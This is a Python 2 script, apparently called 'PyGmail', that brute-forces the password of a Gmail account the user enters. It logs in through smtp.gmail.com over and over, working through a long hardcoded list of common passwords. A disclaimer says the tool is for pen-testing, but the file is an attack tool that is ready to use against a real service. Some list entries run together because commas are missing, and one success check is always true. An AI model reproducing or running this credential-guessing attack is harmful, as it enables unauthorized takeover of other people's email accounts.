#!/usr/bin/python
#+---------------------------------------------------------------------------------------+
#| This code was written for Pen-Testing purpoes.                    					 |
#| Harmful use of this code will resort to consequences for the user not the distributor.|
#| I take no responsibility for any damage in the use of this code.                      |
#| Have fun and be careful!																 |
#+---------------------------------------------------------------------------------------+         

import smtplib
import sys
import time

try:
	from colorama import *
	init()
except:
	print 'Install Colorama Module.'
	print 'sudo pip install colorama'
	sys.exit()

smtpserver = smtplib.SMTP('smtp.gmail.com:587')
smtpserver.ehlo()
smtpserver.starttls()

__author__ = 'ozylol'
__version__ = '0.1.0'

passlist = ['12345','abc123','password','computer','123456','tigger','1234','a1b2c3','qwerty','123','xxx','test','carmen','mickey',
'secret','summer','internet','service','canada','hello','ranger','shadow','baseball','donald','harley','hockey','letmein',
'maggie','mike','mustang','snoopy','buster','dragon','jordan','michael','michelle','mindy','patrick','123abc','andrew',
'bear','calvin','changeme','diamond','fuckme','fuckyou','matthew','miller','ou812','tiger','trustno1','12345678','alex',
'apple','avalon','brandy','chelsea','coffee','dave','falcon','freedom','gandalf','golf','green','helpme','linda','magic','merlin','molson',
'newyork','soccer','thomas','wizard','Monday','asdfgh','bandit','batman','boris','butthead','dorothy',
'eeyore','fishing','football','george','happy','iloveyou','jennifer','jonathan','love','marina','master',
'missy','monday','monkey','natasha','ncc1701','newpass','pamela','pepper','piglet','poohbear','pookie',
'rabbit','rachel','rocket','rose','smile','sparky','spring','steven','success','sunshine','thx1138',
'victoria','whatever','zapata','1','8675309','Internet','amanda','bob','booboo','bradley','brandon','buddy','caitlin',
'andy','angel','august','barney','biteme','boomer','brian','casey','coke','cowboy','delta','doctor','fisher',
'foobar','island','john','joshua','karen','marley','orange','please','rascal','richard','sarah','scooter',
'shalom','silver','skippy','stanley','taylor','welcome','zephyr','111111','1928','aaaaaa','abc',
'access','albert','alexander','andrea','anna','anthony','asdfjkl;','ashley','basf','basketball','basketballislife',
'beavis','black','camaro','charlie','chicken','chris','cindy','cricket','dakota','dallas','daniel','david','debbie',
'dolphin','elephant','emily','fish','fred','friend','fucker','ginger','goodluck','hammer','heather',
'help','iceman','jason','jessica','jesus','joseph','jupiter','justin','kevin','knight','lacrosse','lakers','lizard',
'madison','mary','mother','muffin','murphy','ncc1701d','newuser','nirvana','none','paris','pat','pentium',
'phoenix','picture','rainbow','sandy','saturn','scott','shannon','shithead','skeeter','sophie',
'special','!@#$%','!@#$%^','!@#$%^&','!@#$%^&*','*','0','0racl3','0racl38','0racl38i','0racl39','0racl39i',
'0racle','0racle10','0racle10i','0racle8','0racle8i','0racle9','0racle9i','1','1022','10sne1','111111',
'121212','1225','123','123123','1234','12345','123456','1234567','12345678','123456789','1234qwer','123abc',
'123go','1313','131313','13579','14430','1701d','1928','1951','199220706','1a2b3c','1p2o3i','1q2w3e',
'1qw23e','1sanjose','2','20','2000','2001','2002','2003','2112','21122112','2222','246','249',
'2welcome','369','4444','4runner','5252','54321','5555','5683','6071992','654321','666','666666','6969','696969',
'7','7007','777','7777','80486','8675309','888888','90210','911','92072','99999999','<invalid>','<unknown>',
'@#$%^&','a','a&m','a&p','abcde12345','a12345','a1b2c3','a1b2c3d4','aa','aaa','aaaaaa','aaas','aal',
'aalii','aam','aani','aardvark','aardwolf','stephanie','stephen','steve','sweetie','teacher','tennis',
'test123','tommy','topgun','tristan','wally','william','wilson','1q2w3e','654321','666666','777777'
'0-1-laws','0-recurrent','0-set','0-summable''00pcn','0000','00000','000000','0000000','00000000',
'000000000','0000000000','00000000000','000000000000','0000000000000','00000000000000','000000000000000',
'001069','00106i57','1234567890','0987654321','00106ic','00106ic41','00106ic4119','00106iz3','0010n6','00119',
'001241i','0012d','0013mm4','0014k','001i73','001i7ic','003ci41','003cium','004n6ium','005736i73','005736i7ic','005c0p3','005c0p9','005p0120u5',
'005p0123','005p012343','005p0124n63','005p0124n6ium','005p012ic','005p012if3120u5','005p312m','005ph3123','0060n3','0060ni0ph0123',
'0060ni41','0060nium','006124ph','006134','0063n35i5','0063n37ic','0063n9','0064m0u5','0064m373','0064m9','0070c0id','0070c0id34','0070c0id34n',
'0070c0u5','0079p3','007h3c4','007h3c41','007id','009b','00b1457','00b1457ic','00c935i5','00c957','00c9574c30u5',
'00c9574c343','00c957i5','00c957ic','00c973','00d135','00f7i5h','00f9','00fbi12d','00id','00id41','00kin35i5','00kin373'
'00kin37ic','00m','00m37129','00m3712ic','00m37312','00m4n7i4','00m4nc9','00m9c370u5','00m9c373','00m9c3735','00n5','00n7','00p012ph912in',
'00p0d','00p0d41','00p1457''00p145m','00p145mic','00p4k','00ph01201212h4ph9','00ph01203pi13p59','00ph0120541pin63c70m9','00ph0120570m9',
'00ph012070m9','00ph0120m4','00ph0120m414ci4','00ph0120m4ni4','00ph0120n','00ph0120p3x9','00ph0123','00ph01230c313',
'00ph0123c70m9','00ph012416i4','00ph0124ux3','00ph012h9573123c70m9','00ph012i7i5','00ph012ic','00ph012idium','00ph973',
'00ph97ic','00z00id','00z3','00z9','00zi19','00zin355','01',
'01-matrices','01-matrix','01-sequences','01-valued','01-vector','01012','01012050','01069','0106i57','0106i57ic','0106ic41','010m40',
'010n375','010n375i4n','010n375i5h','010n4','0110ck','0113ni73''0114','0114mh','0114p0d','011i3','012','01201069',
'0120106i57','0120106ic41','01201in6u41','01204n41','01206124ph','01206124ph9','01206124phic','01206124phic41','01206124phic4119',
'012063n','012063n359','012063n35i5','012063n37ic','012063n9','012063nic','01207h3124p9','01207in4n','01207und','01207undi79',
'0120b470id34','0120b47h9m3712ic','0120b4nch3','0120b4nch30u5','0120b4nch4c30u5','0120b4nch4c343','0120c1247ic','0120ch0n',
'0120di46n05i5','0120h31i06124ph','0120h9d1206124ph9','0120h9d1206124phic','0120h9d1206124phic41','0120hippu5','0120id3']


def begin_brute_force():

	print Fore.CYAN + '\n /$$$$$$$             /$$$$$$                          /$$ /$$'
	print'| $$__  $$           /$$__  $$                        |__/| $$'
	print'| $$  \ $$ /$$   /$$| $$  \__/ /$$$$$$/$$$$   /$$$$$$  /$$| $$'
	print'| $$$$$$$/| $$  | $$| $$ /$$$$| $$_  $$_  $$ |____  $$| $$| $$'
	print'| $$____/ | $$  | $$| $$|_  $$| $$ \ $$ \ $$  /$$$$$$$| $$| $$'
	print'| $$      | $$  | $$| $$  \ $$| $$ | $$ | $$ /$$__  $$| $$| $$'
	print'| $$      |  $$$$$$$|  $$$$$$/| $$ | $$ | $$|  $$$$$$$| $$| $$'
	print'|__/       \____  $$ \______/ |__/ |_/ |__/ \_______/|__/|__/ '
	print'           /$$  | $$                                          '
	print'          |  $$$$$$/                                          '
	print'           \______/ 											'
	print'\t\t\t\t\tVersion [%s]' % __version__

	user = raw_input(Fore.RESET + '\n\n\n\nGmail Account: ')
	for password in passlist:
	    try:
	        smtpserver.login(user, password)
	        if password == password:
	        	print '\n\t[!] Password Found: %s' % password
	        	break;
	        	sys.exit()
	        else:
	        	print '\n\t[!] Error'
	        	sys.exit()

	    except smtplib.SMTPAuthenticationError:
	    	print Fore.CYAN + '[!] Trying: %s' % password


	    except smtplib.SMTPServerDisconnected:
	    	print '\n\t[?] Connection unexpectedly closed.'
	    	sys.exit()

	    except KeyboardInterrupt:
	    	raw_input("\n\t[!] Quiting Session...")
	    	print '\n[!] Session Closed.'
	    	sys.exit()

begin_brute_force()



        